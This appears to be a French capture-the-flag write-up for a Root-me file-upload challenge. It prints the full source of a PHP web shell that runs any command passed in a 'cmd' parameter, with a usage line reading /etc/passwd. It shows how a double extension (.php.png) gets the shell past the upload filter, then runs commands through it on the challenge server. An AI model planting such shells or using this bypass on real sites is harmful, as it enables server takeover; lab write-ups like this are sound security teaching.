---
title: Root-me - File upload - Double extensions
meta_title: ""
description: 
date: 2024-06-07T05:00:00Z
image: /images/rootme_logo.png
categories:
  - WebServeur
  - Facile
author: Tmax
tags:
  - WebServeur
  - Rootme
draft: false
---

# Introduction

Pour ce challenge, nous allons devoir réaliser un upload de photo depuis une galerie, sauf que cette photo devra avoir deux extensions. 

{{< tabs >}} {{< tab "Niveau 1" >}}
- Vous avez bien lu la description du challenge ? 
- Vous avez essayé de regarder des techniques sur Internet ? 
- Savez vous ce qui ce trouve sur une Kali à cet emplacement ? : `/usr/share/webshells/`

{{< /tab >}}

{{< tab "Niveau 2" >}}

Il suffit simplement de copier le fichier suivant, et de le renommer en : `simple-backdoor.php.png` : 

```bash
cat /usr/share/webshells/php/simple-backdoor.php
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

<!--    http://michaeldaw.org   2006    -->
```

Puis de l'upload. 

Si à présent nous envoyons une requête à l'URL que nous donne l'application, nous pouvons exécuter les commandes que nous voulons : 

```
http://challenge01.root-me.org/web-serveur/ch20/galerie/upload/e646c398835db94aabc374a3ac1dbeac/simple-backdoor.php.png?cmd=ls%20-la%20../../..
```

```
total 64
drwxr-s---  4 web-serveur-ch20 www-data   4096 Aug  4  2022 .
drwxr-s--x 93 challenge        www-data   4096 Jan 16 15:14 ..
-r-x------  1 root             root        723 Aug  4  2022 ._init
-r--------  1 challenge        challenge   274 Dec 10  2021 ._nginx.http-level.inc
-r--------  1 challenge        challenge   904 Dec 10  2021 ._nginx.server-level.inc
-r--------  1 root             www-data  12306 Dec 18  2021 ._perms
-r--------  1 challenge        challenge   645 Dec 10  2021 ._php-fpm.pool.inc
-rw-r-----  1 root             www-data     44 Dec 10  2021 .git
-rw-r-----  1 root             www-data    181 Dec 12  2021 .gitignore
-r--------  1 web-serveur-ch20 www-data     26 Dec 10  2021 .passwd
drwxr-s---  8 web-serveur-ch20 www-data   4096 Dec 12  2021 galerie
-r--r-----  1 web-serveur-ch20 www-data   3974 Dec 10  2021 index.php
drwxrwsrwx  2 web-serveur-ch20 www-data   4096 Jul  8 15:55 tmp
```

{{< /tab >}}
{{< /tabs >}}

